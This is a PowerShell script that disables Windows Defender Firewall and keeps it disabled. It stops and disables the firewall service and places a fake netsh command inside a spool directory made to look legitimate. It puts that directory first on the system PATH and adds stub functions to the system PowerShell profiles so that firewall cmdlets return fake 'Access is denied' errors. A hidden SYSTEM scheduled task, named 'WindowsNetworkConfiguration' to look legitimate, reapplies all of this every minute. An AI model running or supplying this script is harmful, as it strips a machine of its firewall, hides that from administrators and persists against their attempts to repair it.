# firewall_deny_task.ps1

$shadowDir = "C:\Windows\System32\spool\drivers\color\tools"
New-Item -ItemType Directory -Force -Path $shadowDir | Out-Null

$enforcePath = "C:\Windows\System32\spool\fw_enforce.ps1"

# write enforcement script line by line to avoid nested here-string issue
$lines = @(
    '$shadowDir = "C:\Windows\System32\spool\drivers\color\tools"',
    'New-Item -ItemType Directory -Force -Path $shadowDir | Out-Null',
    '',
    '# netsh shadow',
    '"@echo off`necho The following command was not found: advfirewall`nexit /b 1" | Out-File -FilePath "$shadowDir\netsh.cmd" -Encoding ascii -Force',
    '',
    '# keep MpsSvc disabled',
    'sc.exe config MpsSvc start= disabled | Out-Null',
    'Stop-Service -Name MpsSvc -Force -ErrorAction SilentlyContinue',
    '',
    '# keep PATH poisoned',
    '$currentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")',
    'if ($currentPath -notmatch [regex]::Escape($shadowDir)) {',
    '    [Environment]::SetEnvironmentVariable("PATH", "$shadowDir;$currentPath", "Machine")',
    '}',
    '',
    '# keep profile blocks in place',
    '$block = "function Set-NetFirewallRule { Write-Error ''Access is denied.'' }`n" +',
    '         "function New-NetFirewallRule { Write-Error ''Access is denied.'' }`n" +',
    '         "function Remove-NetFirewallRule { Write-Error ''Access is denied.'' }`n" +',
    '         "function Enable-NetFirewallRule { Write-Error ''Access is denied.'' }`n" +',
    '         "function Disable-NetFirewallRule { Write-Error ''Access is denied.'' }`n" +',
    '         "function Get-NetFirewallRule { Write-Error ''Access is denied.'' }`n" +',
    '         "function Set-NetFirewallProfile { Write-Error ''Access is denied.'' }"',
    '',
    '$profilePaths = @(',
    '    "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1",',
    '    "C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1"',
    ')',
    'foreach ($p in $profilePaths) {',
    '    $dir = Split-Path $p',
    '    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }',
    '    $existing = if (Test-Path $p) { Get-Content $p -Raw } else { "" }',
    '    if ($existing -notmatch "Set-NetFirewallRule") {',
    '        Add-Content -Path $p -Value $block -Force',
    '    }',
    '}'
)

Set-Content -Path $enforcePath -Value $lines -Encoding utf8 -Force

# run immediately
& powershell.exe -ExecutionPolicy Bypass -File $enforcePath

# register scheduled task
$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$enforcePath`""

$trigger = New-ScheduledTaskTrigger `
    -RepetitionInterval (New-TimeSpan -Minutes 1) `
    -Once -At (Get-Date)

$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -ExecutionTimeLimit (New-TimeSpan -Minutes 1) `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1)

$principal = New-ScheduledTaskPrincipal `
    -UserId "SYSTEM" `
    -RunLevel Highest

Register-ScheduledTask `
    -TaskName "WindowsNetworkConfiguration" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -Principal $principal `
    -Force